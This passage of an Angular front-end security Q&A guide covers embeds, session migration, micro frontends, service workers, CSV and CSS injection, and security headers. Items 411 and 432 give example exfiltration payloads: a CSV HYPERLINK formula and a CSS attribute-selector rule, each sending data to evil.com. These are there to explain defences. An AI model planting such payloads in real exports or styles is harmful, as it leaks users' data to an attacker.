6. Add secret scanning to CI so it doesn't happen again.

## 397: How would you safely support YouTube and Vimeo embeds in user posts?

Don't allow raw `<iframe>` in user HTML. Instead:

1. Let users paste a video link.
2. On the server, parse it, check the host against an allowlist, and extract the video ID with a strict pattern.
3. Store `{ provider: 'youtube', id: 'abc123' }`.
4. In Angular, render a component that builds the embed URL from the ID and trusts only that.

```ts
@Component({
  selector: "app-video",
  template: `<iframe
    [src]="src()"
    sandbox="allow-scripts allow-same-origin allow-presentation"
    allowfullscreen
  ></iframe>`,
})
export class Video {
  id = input.required<string>();
  private sanitizer = inject(DomSanitizer);
  src = computed(() => {
    if (!/^[\w-]{11}$/.test(this.id())) throw new Error("Bad video id");
    return this.sanitizer.bypassSecurityTrustResourceUrl(
      `https://www.youtube-nocookie.com/embed/${this.id()}`,
    );
  });
}
```

Add `frame-src https://www.youtube-nocookie.com` to your CSP.

## 398: How do you embed a third-party BI dashboard that needs a token?

Don't put a long-lived token in the iframe URL. Ask your back-end for a short-lived, scoped embed token for this user and this dashboard, then pass it to the iframe using the vendor's SDK or `postMessage` with an exact target origin.

Make sure the vendor applies row-level security for the user, add the vendor's origin to `frame-src`, and give the iframe the smallest `sandbox` and `allow` settings that work.

## 399: How would you migrate from JWTs in localStorage to cookie-based sessions?

1. Add a BFF or cookie-issuing endpoint that sets an httpOnly, Secure, SameSite cookie at login.
2. Update the API (or BFF) to accept the cookie, and add CSRF protection.
3. In Angular, remove the auth interceptor's token logic, keep XSRF on, and use `withCredentials` if the API is cross-origin.
4. Run both methods for a while, then stop accepting bearer tokens from the browser.
5. On first load after release, delete old tokens from `localStorage`.
6. Revoke old refresh tokens.

Plan for the CORS and CSRF changes; they're where most migration bugs show up.

## 400: What security issues come with micro frontends on the same origin?

All micro frontends on one origin share the same cookies, storage and DOM. A single XSS bug in any remote, or a compromised remote build, can attack every other part of the app, including auth.

Load remotes only from trusted, fixed URLs (not from config users can change), consider SRI or signed manifests, use one auth implementation in the shell, and apply the same security reviews and CSP to every team's code. If a part can't be trusted equally, put it on a separate origin in an iframe.

## 401: How do you secure loading of remote micro frontends with Native Federation or Module Federation?

- Keep the list of remote URLs in the shell's own config or a manifest you control, never in query params or user settings.
- Serve remotes over HTTPS from your own domains, and include them in a strict CSP.
- Version the manifest with releases so a remote can't be swapped silently.
- Share Angular and auth libraries as singletons so remotes use the shell's auth instead of their own copies.
- Review remote deploy pipelines with the same care as the shell's, because their code runs with the shell's full access.

## 402: How would you design an "impersonate user" feature for support staff?

Do it entirely on the server: the support agent asks the API to start impersonation, the server checks their permission, logs it, and issues a session that carries both the agent's ID and the target user's ID. The API uses this to block risky actions (like changing passwords or payments) during impersonation.

In Angular, show a clear banner while impersonating and an "exit" button. Never implement it by letting the client swap a user ID in a header or token.

## 403: How do you preview user-uploaded HTML or PDF files safely?

- For PDFs, show them in an `<iframe>` or `<embed>` served from a separate user-content domain, or render them with PDF.js into a canvas.
- For HTML, never show it on your origin. Serve it from a sandboxed domain with `Content-Security-Policy: sandbox` and show it in an `<iframe sandbox>` without `allow-same-origin`.
- Always send `X-Content-Type-Options: nosniff` and the correct content type.

## 404: How do you safely turn URLs and mentions in chat messages into links?

Don't build HTML strings with regex replacements and then bind them to `[innerHTML]`. Split the message into parts and render each with normal bindings:

```ts
type Part =
  | { kind: "text"; value: string }
  | { kind: "link"; href: string; value: string };

parts = computed<Part[]>(() =>
  this.text()
    .split(/(https?:\/\/[^\s<]+)/g)
    .filter(Boolean)
    .map((p) =>
      /^https?:\/\//.test(p)
        ? { kind: "link", href: p, value: p }
        : { kind: "text", value: p },
    ),
);
```

```html
@for (part of parts(); track $index) { @if (part.kind === 'link') {
<a [href]="part.href" target="_blank" rel="noopener noreferrer nofollow"
  >{{ part.value }}</a
>
} @else { {{ part.value }} } }
```

Nothing here is ever parsed as HTML, so there's nothing to sanitize.

## 405: What front-end rules apply to payment pages under PCI DSS 4.0?

PCI DSS 4.0 requirement 6.4.3 says you must keep an inventory of all scripts on payment pages, with a reason for each and a way to confirm they're authorized and unchanged. Requirement 11.6.1 asks for detection of unauthorized changes to the page and its security headers.

For Angular apps, the simplest approach is to use the payment provider's hosted fields or iframe so card data never touches your page, keep third-party scripts off the payment route, use SRI and a strict CSP, and monitor changes with CSP reports or a script-monitoring tool.

## 406: How would you secure an Angular app used on shared or kiosk computers?

- Use short idle timeouts and an absolute session lifetime.
- Store tokens in memory or `sessionStorage`, never `localStorage`.
- Log out of the identity provider too, not just the app.
- Clear caches, service worker data and IndexedDB on logout.
- Don't offer "remember me".
- Send `Cache-Control: no-store` on private pages to reduce what's left in the browser cache and bfcache.

## 407: What changes when an Angular app runs inside Capacitor or a mobile WebView?

The app runs on a special origin like `capacitor://localhost` or `https://localhost`, so CORS rules and cookie behavior differ from the web. `localStorage` is stored on the device and may be backed up.

Store tokens with the platform's secure storage (Keychain on iOS, Keystore on Android) through a plugin, use the system browser for OAuth with PKCE and an app-claimed redirect (universal or app links), and validate deep link parameters like any other untrusted input. Keep native plugins' permissions as small as possible.

## 408: How do you secure a GraphQL client like Apollo Angular?

- Add the auth header in an Apollo link or rely on the Angular `HttpClient` interceptors (Apollo Angular's `HttpLink` uses `HttpClient`).
- Don't rely on hiding queries in the client; the server must check field-level permissions.
- Use persisted queries so the server accepts only known operations.
- Turn off introspection in production unless the API is public.
- Watch query depth and cost on the server to avoid denial of service.

## 409: Do httpResource and resource() change anything about security?

`httpResource` uses `HttpClient` under the hood, so interceptors, XSRF handling and `withCredentials` work the same way. `resource()` with your own `fetch` call doesn't go through interceptors, so you'd need to add auth yourself.

The data from either is still untrusted and should be rendered through normal bindings.

## 410: How do you share validation rules between Angular and the server?

Define the schema once in a shared package, for example with Zod or Valibot, and use it in both places:

```ts
// shared/schemas.ts
export const SignupSchema = z.object({
  email: z.string().email().max(254),
  password: z.string().min(12).max(128),
});
```

Angular uses it for instant feedback (with Signal Forms or a custom validator), and the server uses it to reject bad input. The server check is the one that protects you; the shared schema just keeps both in sync.

## 411: What is CSV injection and can an Angular export feature cause it?

When you export user data to CSV and someone opens it in Excel, cells starting with `=`, `+`, `-`, `@`, tab or carriage return can be treated as formulas. A user who sets their name to `=HYPERLINK("https://evil.com?d="&A1,"Click")` can trick whoever opens the export.

If you build CSV files in the browser, prefix risky values with a single quote and escape quotes:

```ts
function csvCell(value: string): string {
  const safe = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
  return `"${safe.replace(/"/g, '""')}"`;
}
```

## 412: Why are blob URLs of user HTML dangerous?

A `blob:` URL created with `URL.createObjectURL` belongs to your app's origin. If you create a blob from user-supplied HTML with type `text/html` and open it in a new tab or iframe, its scripts run on your origin with access to your cookies and storage.

Use `text/plain` or `application/octet-stream` for downloads of untrusted content, or serve previews from a separate sandboxed domain.

## 413: Is window.open with a user URL safe?

Not by default. You need to check the scheme (only `http:` and `https:`), and pass `noopener` so the new page can't control your tab:

```ts
const url = new URL(userUrl);
if (url.protocol === "https:" || url.protocol === "http:") {
  window.open(url.href, "_blank", "noopener,noreferrer");
}
```

`window.open('javascript:...')` would run code on your origin, and Angular's sanitizer doesn't run for `window.open` calls.

## 414: How can a service worker turn an XSS into a persistent attack?

If an attacker can register a service worker from your origin (for example by uploading a JavaScript file to a path on your domain and running a short XSS), that worker can intercept every request to its scope, even after the XSS is fixed, until it's removed.

Don't serve user uploads from your app's origin, make sure user content can't be served as JavaScript, and know that the `Service-Worker-Allowed` header controls scope. Angular's `ngsw-worker.js` comes from your build and is safe in itself.

## 415: How does the Angular service worker check file integrity?

The build creates `ngsw.json` with a hash of each cached file. When the service worker downloads files for a new version, it checks each file's hash against the manifest. If they don't match, it won't activate that version.

This stops a partially updated or tampered CDN file from being cached as part of your app. It doesn't protect against an attacker who can change both the files and `ngsw.json`.

## 416: How do you make sure users get a security fix when you use the Angular service worker?

The service worker serves the cached version first, so users might run old code until they reload. Use `SwUpdate` to check for updates and force a reload when a new version is ready:

```ts
const updates = inject(SwUpdate);
updates.versionUpdates
  .pipe(filter((e) => e.type === "VERSION_READY"))
  .subscribe(() => {
    updates.activateUpdate().then(() => document.location.reload());
  });
```

Also handle `unrecoverable` events by reloading. For urgent fixes, you can call `checkForUpdate()` on an interval or when the app returns to the foreground.

## 417: What is safety-worker.js in Angular?

It's a "kill switch" service worker shipped with `@angular/service-worker`. If your service worker is broken or serving a dangerous version, you deploy `safety-worker.js` in place of `ngsw-worker.js`. It unregisters itself and deletes the caches, so users load the app fresh from the network.

It's worth knowing about before you need it in an incident.

## 418: Does zoneless change detection affect security?

Not directly. Zoneless change detection (the default in new apps since Angular 21) changes how Angular knows when to update the view, not how it sanitizes values or handles HTTP.

One side benefit: without `zone.js` patching browser APIs, there's one less third-party library modifying globals in your page.

## 419: Why should you never use Angular's private ɵ APIs to get around sanitization?

Angular has internal functions (starting with `ɵ`) used by compiled code, some of which create trusted values without checks. Calling them directly skips the public bypass methods, so lint rules and Trusted Types settings for `angular#unsafe-bypass` might not catch it.

Private APIs can also change in any release. If you need trusted content, use the public `DomSanitizer` methods in a reviewed service.

## 420: What layers of defense would you put in an Angular app against XSS?

1. Render through bindings; no direct DOM writes.
2. Sanitize rich content on the server and again in Angular.
3. No `bypassSecurityTrust*` outside one reviewed service.
4. Strict CSP with nonces or hashes.
5. Trusted Types enforced.
6. Tokens out of JavaScript (httpOnly cookies or BFF).
7. Lint rules, CodeQL and tests for regressions.
8. Patched Angular and dependencies.

Each layer covers the cases where another one fails.

## 421: What security headers would you set for a typical Angular SPA?

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{n}' 'strict-dynamic'; style-src 'self' 'nonce-{n}'; img-src 'self' data:; connect-src 'self' https://api.example.com; object-src 'none'; base-uri 'self'; frame-ancestors 'self'; require-trusted-types-for 'script'; trusted-types angular angular#bundler
Strict-Transport-Security: max-age=63072000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin-allow-popups
```

Adjust `connect-src`, `img-src` and the nonce setup to your app. On static hosting without nonces, use `autoCsp` hashes or `script-src 'self'`.

## 422: How do you measure the security headers of a deployed app?

Use tools like Mozilla HTTP Observatory, `securityheaders.com` and Google's CSP Evaluator. They grade your headers and point out weak CSP rules like `'unsafe-inline'` or broad host allowlists.

Run them in CI against staging (Observatory has a CLI and API) so a deploy that drops a header is noticed.

## 423: How should a front-end team handle incoming security reports?

Publish a `/.well-known/security.txt` with a contact address, so researchers know where to report. Have a process: confirm receipt, reproduce, rate severity, fix, and tell the reporter.

Many "vulnerabilities" sent to front-end teams are about things like missing headers on static pages or self-XSS in the console. Handle them politely, but focus effort on issues with real impact.

## 424: What's wrong with logging security events only from the client?

Client logs come from code the attacker controls. They can be blocked, faked or flooded. A missing "suspicious activity" log from the client means nothing.

Use client logs (like CSP reports or failed login counters) as hints, but record security events that matter, such as logins, permission failures and admin actions, on the server.

## 425: Does encrypting data in localStorage make it safe?

Usually no. If the key is in the bundle or also in the browser, any script that can read the encrypted data can also read the key and decrypt it.

It only helps in narrow cases, for example when the key is a non-extractable WebCrypto key or comes from the server per session and the goal is protecting data at rest on the disk. Against XSS, it doesn't help.

## 426: Is code obfuscation a security measure for Angular apps?

No. Obfuscation makes code harder to read, but it can always be reversed with enough effort, and the browser needs to run it, so all the logic is there. It also makes debugging harder and can hurt performance.

Anything that must stay secret or must be enforced belongs on the server. Minification in production builds is enough for size.

## 427: How do you protect an Angular app's APIs from bots?

Front-end measures help a bit: CAPTCHA or invisible challenges (Turnstile, reCAPTCHA v3), device signals, and making requests carry tokens from those tools. But bots can run real browsers.

The real protection is on the server and edge: rate limits per user and IP, bot management at the CDN or WAF, business rules (limits on purchases, sign-ups), and monitoring for abnormal patterns.

## 428: How would you secure a new Angular app from day one?

- Start with `ng new`, AOT, strict mode and the latest Angular.
- Use an OIDC library with code flow and PKCE, or a BFF.
- Functional interceptor that adds tokens only for your API; keep XSRF on for cookie APIs.
- Guards for UX only; server checks every permission.
- No `bypassSecurityTrust*` or direct DOM writes without review.
- Strict CSP and Trusted Types from the start (much easier than adding later).
- Security headers on the host, HTTPS and HSTS.
- No secrets in environments; no public source maps.
- `npm ci`, lockfile, Renovate or Dependabot, audit in CI.
- Tests for escaping, guards and interceptors.

## 429: Why is it easier to add CSP and Trusted Types at the start of a project?

At the start, there's little code and few libraries, so you notice the first library or pattern that breaks the policy and choose another. Later, you may have dozens of components using `innerHTML`, inline scripts from marketing tools and libraries that need `'unsafe-eval'`, and turning on enforcement becomes a long project.

Enforcing early also teaches the team the safe patterns from the first day.

## 430: What would you do if the business wants to add a marketing tag to every page, including login?

Explain the risk: the tag runs with full access to the page, including the password field. Then offer options:

- Load it only on marketing pages, not on login, account or payment pages.
- Load it after consent and with SRI if the file is versioned.
- Use server-side tagging where events are sent from your back-end instead of running vendor scripts in the browser.
- Keep it within CSP, so you know exactly which domains it uses.

Document the decision and who accepted the risk.

## 431: How do you safely let admins customize the app's look with CSS?

Custom CSS can't run scripts in modern browsers, but it can hide or fake UI elements, leak data through attribute selectors and background-image URLs, and load external resources.

Limit customization to a set of theme variables (colors, fonts, logo URL from your own storage) and apply them as CSS custom properties:

```ts
document.documentElement.style.setProperty("--brand-color", theme.brandColor);
```

Validate values (for example, a color regex) on the server. If you must allow raw CSS, sanitize it with a CSS parser and only allow specific properties.

## 432: Can CSS injection leak data from an Angular app?

Yes. If an attacker can inject CSS, rules like `input[value^="a"] { background: url(https://evil.com/?a) }` can leak an input's value one character at a time, as long as the value is in an attribute. They can also hide warnings or move buttons.

Don't allow user-controlled `<style>` content, keep `style-src` strict, and don't put secrets like CSRF tokens in DOM attributes on pages with user-controlled styles.

## 433: What are the security considerations of @defer blocks?

`@defer` only delays loading the component code until a trigger fires. The code is still public in a chunk, and the data it shows still comes from the API.

So don't use `@defer (when isAdmin())` as a way to protect admin features. It's a performance tool. If the deferred block loads sensitive data, the API call it makes must be authorized on the server.

## 434: How do you handle security of iframes created by Angular components dynamically?

Bind only trusted, constructed URLs to `[src]`, keep `sandbox` and `allow` static in the template (Angular enforces this, error NG0910), and set `referrerpolicy`:

```html
<iframe
  [src]="embedUrl()"
  sandbox="allow-scripts allow-forms"
  referrerpolicy="no-referrer"
  loading="lazy"
></iframe>
```

Also add the iframe's origin to `frame-src` in your CSP, and use `postMessage` with origin checks if you need to talk to it.

## 435: What can go wrong with Angular's HttpClient when the API uses redirects?

When the API responds with a redirect, the browser follows it automatically for `HttpClient` requests. If the redirect goes to another origin, cookies for the new origin may be sent, and custom headers like `Authorization` are dropped on cross-origin redirects by modern browsers (fetch spec), which can break auth in surprising ways.

Avoid redirects in API responses. If a session expires, return 401 and let the app handle it, instead of redirecting to a login page that `HttpClient` will try to parse as JSON.

## 436: How do you protect against session fixation in a cookie-based Angular app?

Session fixation is when an attacker gets a victim to use a session ID the attacker knows, then waits for the victim to log in. The fix is on the server: create a new session ID at login and when privileges change, and ignore session IDs that the server didn't issue.

From Angular's side, there's nothing to change except not letting session IDs appear in URLs, which would make fixation easier.

## 437: Why should the Angular app avoid storing user data in URLs?

URLs end up in browser history, bookmarks, logs, analytics and the `Referer` header. Things like search terms for medical topics, emails or IDs in query params can leak.

Keep sensitive filters in component state or POST bodies, and keep URLs for navigation and shareable, non-sensitive state. Set `Referrer-Policy` to limit what leaves the site.

## 438: How does the browser's Referer header interact with Angular routes?

When the app loads an image, script or API from another origin, or the user clicks an external link, the browser may send the current URL in `Referer`. With path-based routes, that includes things like `/patients/123/records`.

With `strict-origin-when-cross-origin` (the browser default), only the origin is sent cross-origin. For sensitive pages, `no-referrer` is safer. Use the `referrerpolicy` attribute on specific links or images if needed.

## 439: How can an attacker abuse an "export my data" feature?

- If the export is generated in the background and downloaded by an ID, an attacker might guess other users' export IDs (IDOR).
- If the download link has a long-lived token in the URL, it can leak through email or logs.
- If the export includes HTML from users and is opened in the browser, it can run scripts.

Use short-lived signed URLs tied to the user, check ownership on download, and serve exports as attachments with the right content type.

## 440: What are the risks when Angular apps use browser extensions' APIs or vice versa?

Extensions with page access can read the DOM, storage and requests of your app; you can't stop users from installing them. Some apps also talk to their own extension through `postMessage` or `externally_connectable`.

Don't assume extension messages come from your extension: validate the sender and message format. And remember that sensitive data shown in the DOM is visible to every extension with access to the site.

## 441: How do you avoid leaking data through the browser's autofill and page title?

- Don't put private data in `document.title` (set with Angular's `Title` service), since titles show in history, tabs and screen sharing.
- Use correct `autocomplete` values so browsers don't save sensitive fields in general form history.
- Avoid showing full card numbers, IDs or tokens on screen; mask them.

These are small things, but they come up in audits for banking and health apps.

## 442: What's the risk of verbose API errors shown directly in Angular?

If the app shows `error.error.message` from the API as is, back-end exceptions like SQL errors, file paths or internal hostnames can appear on screen. Attackers use these details.

Map API errors to user-friendly messages in the front-end, and make the API return safe error codes and messages in production. If you show server messages, render them as text, not HTML.

## 443: How would you secure feature toggles that are evaluated on the client?

Assume users can turn any client-side toggle on. Use toggles to show or hide UI, but have the API check the same toggle for the user before allowing the feature's endpoints.

For a gradual rollout of a risky change, also keep the old and new APIs protected separately, so turning on the UI flag in dev tools doesn't give access to a back-end that isn't ready.

## 444: Can an attacker use your Angular app's own JavaScript against it?

Yes. With XSS, the attacker can call your services through the app itself, for example by finding the Angular injector in dev mode or by calling functions exposed on `window`. Even without XSS, open redirects, `postMessage` handlers and URL-driven actions (like `/delete?id=5` routes that run on load) can be triggered by links from other sites.

Avoid exposing services or debug helpers on `window`, don't run destructive actions on navigation without confirmation, and treat every entry point (URL, message, storage) as untrusted input.

## 445: Why shouldn't routes trigger destructive actions on load?

A route like `/account/delete-confirm?token=...` that deletes something as soon as it loads can be triggered by an `<img>`, a link preview bot, or another site opening it. Email scanners and link previewers often open links automatically.

Show a page with a button, and make the action a `POST` (or `DELETE`) with CSRF protection when the user confirms.

## 446: How do you limit what a compromised third-party script can do?

- Put it in a sandboxed iframe on another origin and talk through `postMessage` (the strongest option).
- Use CSP `connect-src` and `img-src` to limit where it can send data.
- Load it only on pages that need it.
- Use Trusted Types so it can't write raw HTML into the DOM.
- Keep tokens out of storage it can read.

Some teams use a "partytown" approach to move third-party scripts into a Web Worker. That mainly helps performance; only a separate origin really limits access.

## 447: What does the OWASP ASVS add on top of the Top 10 for Angular teams?

The OWASP ASVS (Application Security Verification Standard) is a detailed checklist of security requirements, grouped by area (authentication, session management, access control, input handling, configuration and so on) with three levels.

The Top 10 tells you what usually goes wrong; ASVS tells you what to check. Front-end teams can pick the requirements that apply to the client (for example, CSP, token storage, output encoding) and add them to their definition of done.

## 448: How do you test that your CSP actually blocks an XSS payload?

In a test environment, add a test-only page or component that injects a known payload through a path that bypasses Angular (like `nativeElement.innerHTML`), then check that the script didn't run and a violation was reported:

```ts
test("CSP blocks injected inline script", async ({ page }) => {
  await page.goto("/csp-test");
  const ran = await page.evaluate(() => (window as any).__xssRan === true);
  expect(ran).toBe(false);
});
```

Make sure the test page isn't included in production builds, for example by registering its route only in a test configuration.

## 449: What is the difference between output encoding for HTML, attributes, URLs and JavaScript?

Each place in a page has different special characters:

- **HTML text**: `<`, `>`, `&`.
- **HTML attributes**: also quotes.
- **URLs**: needs `encodeURIComponent` for parts and a scheme check for the whole URL.
- **JavaScript strings**: quotes, backslashes, `</script>`.

Angular handles the first three for bindings. You need to think about it when you leave Angular, for example in `server.ts`, email templates, CSV exports or `postMessage` handlers that build strings.

## 450: What is the most important thing to remember about Angular security?

Angular gives you strong defaults: escaped bindings, sanitized HTML and URLs, XSRF support, AOT, Trusted Types and CSP support. Most real security bugs in Angular apps come from going around those defaults or from trusting the client.

Keep data flowing through bindings, keep secrets and decisions on the server, add browser-level defenses like CSP and Trusted Types, and keep Angular and your dependencies patched.
